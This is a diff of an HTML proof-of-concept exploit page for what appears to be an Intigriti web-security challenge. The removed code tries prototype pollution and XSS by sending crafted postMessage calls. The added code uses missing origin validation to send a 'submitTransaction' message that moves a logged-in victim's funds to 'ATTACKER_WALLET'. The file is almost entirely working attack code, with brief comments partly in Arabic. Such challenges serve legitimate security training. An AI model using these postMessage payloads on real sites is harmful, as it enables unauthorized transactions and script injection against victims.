@@ -1,47 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Exploit</title>
+  <meta charset="utf-8">
+  <title>PostMessage Logic Abuse – PoC</title>
 </head>
 <body>
-    <script>
-        // Step 1: Open checkout page
-        const win = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=__proto__&price=150&amount=1', '_blank');
-        
-        // Step 2: Wait for page to load and iframe to be ready
-        setTimeout(() => {
-            // Step 3: Send malicious init message to payment gateway
-            win.postMessage({
-                type: 'init',
-                currency: '__proto__',
-                amount: 1,
-                price: 150
-            }, '*');
-            
-            // Step 4: Pollute the prototype chain
-            setTimeout(() => {
-                win.postMessage({
-                    type: 'init',
-                    currency: '1337COIN',
-                    amount: 1,
-                    price: 150
-                }, '*');
-                
-                // Step 5: Trigger XSS after currency icon is rendered
-                setTimeout(() => {
-                    // The color property will be taken from polluted prototype
-                    // This executes our XSS payload
-                    win.postMessage({
-                        type: 'submitTransaction',
-                        transaction: {
-                            toAddress: 'attacker-wallet',
-                            currency: '1337COIN',
-                            amount: 1
-                        }
-                    }, '*');
-                }, 500);
-            }, 500);
-        }, 2000);
-    </script>
+
+<script>
+/*
+  Preconditions:
+  - Victim logged in
+  - Target page listens to postMessage
+  - No origin validation
+*/
+
+// افتح صفحة checkout
+const win = window.open(
+  "https://challenge-0126.intigriti.io/checkout.html?currency=1337coin&price=150",
+  "_blank"
+);
+
+// استنى الصفحة تجهز
+setTimeout(() => {
+
+  // الرسالة الحساسة
+  win.postMessage({
+    type: "submitTransaction",
+    transaction: {
+      toAddress: "ATTACKER_WALLET",
+      currency: "1337coin",
+      amount: 1
+    }
+  }, "*");
+
+  console.log("[+] submitTransaction sent");
+
+}, 3000);
+</script>
+
 </body>
 </html>
